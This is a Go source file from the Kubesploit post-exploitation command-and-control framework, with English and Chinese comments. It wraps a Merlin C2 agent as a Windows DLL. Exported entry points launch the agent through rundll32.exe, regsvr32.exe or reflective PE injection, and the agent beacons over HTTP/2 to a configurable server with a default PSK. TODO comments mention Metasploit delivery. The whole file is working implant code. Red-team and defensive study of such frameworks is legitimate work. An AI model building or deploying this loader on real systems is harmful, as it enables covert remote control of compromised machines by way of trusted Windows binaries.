# `kubesploit\cmd\merlinagentdll\main.go`

```go
// +build windows,cgo
// 指定构建约束，表示该文件只在 Windows 系统下使用 CGO 构建

// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
// This file is part of Kubesploit.
// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.
// Kubesploit 是一个基于 Russel Van Tuyl 的 Merlin 框架构建的后渗透命令和控制框架。
// 本文件是 Kubesploit 的一部分。
// 版权所有 2021 CyberArk Software Ltd。保留所有权利。

// Kubesploit is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
// Kubesploit 是自由软件：您可以根据自由软件基金会发布的 GNU 通用公共许可证的条款重新分发或修改它，无论是许可证的第 3 版还是任何后续版本。

// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
// Kubesploit shall not be used in any malicious manner.
// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// Kubesploit 分发的目的是为了增强组织的安全性。
// Kubesploit 不得以任何恶意方式使用。
// Kubesploit 按原样分发，不附带任何保证；包括适销性或特定用途适用性的暗示保证。详细信息请参阅 GNU 通用公共许可证。

// You should have received a copy of the GNU General Public License
// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.
// 您应该已经收到了 GNU 通用公共许可证的副本，连同 Kubesploit 一起。如果没有，请参阅 <http://www.gnu.org/licenses/>。

package main

import (
    "C"
    "os"
    "strings"

    // Merlin
    "kubesploit/pkg/agent"
)

var url = "https://127.0.0.1:443"
var psk = "merlin"
var proxy = ""
var host = ""
var ja3 = ""

func main() {}

// run is a private function called by exported functions to instantiate/execute the Agent
// run 是一个私有函数，由导出函数调用以实例化/执行 Agent
func run(URL string) {
    a, err := agent.New("h2", URL, host, psk, proxy, ja3, false, false)
    if err != nil {
        os.Exit(1)
    }
    errRun := a.Run()
    if errRun != nil {
        os.Exit(1)
    }
}

// EXPORTED FUNCTIONS

//export Run
// Run is designed to work with rundll32.exe to execute a Merlin agent.
// The function will process the command line arguments in spot 3 for an optional URL to connect to
// Run 旨在与 rundll32.exe 一起使用，以执行 Merlin 代理。
// 该函数将处理第 3 个位置的命令行参数，用于连接到可选的 URL
func Run() {
    // If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,Run"
    // 如果使用 rundll32，位置 0 是 "rundll32"，位置 1 是 "merlin.dll,Run"
    if len(os.Args) >= 3 {
        if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
            url = os.Args[2]
        }
    }
    run(url)
}

//export VoidFunc
// VoidFunc 是一个导出函数，与 PowerSploit 的 Invoke-ReflectivePEInjection.ps1 一起使用
func VoidFunc() { run(url) }

//export DllInstall
// DllInstall 在使用 regsvr32.exe 执行 Merlin 代理时使用（例如 regsvr32.exe /s /n /i merlin.dll）
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
// TODO 添加支持通过 /i:"https://192.168.1.100:443" merlin.dll 传递 Merlin 服务器 URL
func DllInstall() { run(url) }

//export DllRegisterServer
// DLLRegisterServer 在使用 regsvr32.exe 执行 Merlin 代理时使用（例如 regsvr32.exe /s merlin.dll）
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
func DllRegisterServer() { run(url) }

//export DllUnregisterServer
// DLLUnregisterServer 在使用 regsvr32.exe 执行 Merlin 代理时使用（例如 regsvr32.exe /s /u merlin.dll）
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
func DllUnregisterServer() { run(url) }

//export Merlin
// Merlin 是一个导出函数，接受一个 C *char，将其转换为字符串，并执行它。
// 用于 DLL 加载
func Merlin(u *C.char) {
    if len(C.GoString(u)) > 0 {
        url = C.GoString(u)
    }
    run(url)
}

// TODO 添加入口点 0（是的，是零）以便与 Metasploit 的 windows/smb/smb_delivery 一起使用
// TODO 将导出函数移动到 merlin.c 中以正确处理它们，并仅导出 Run()
```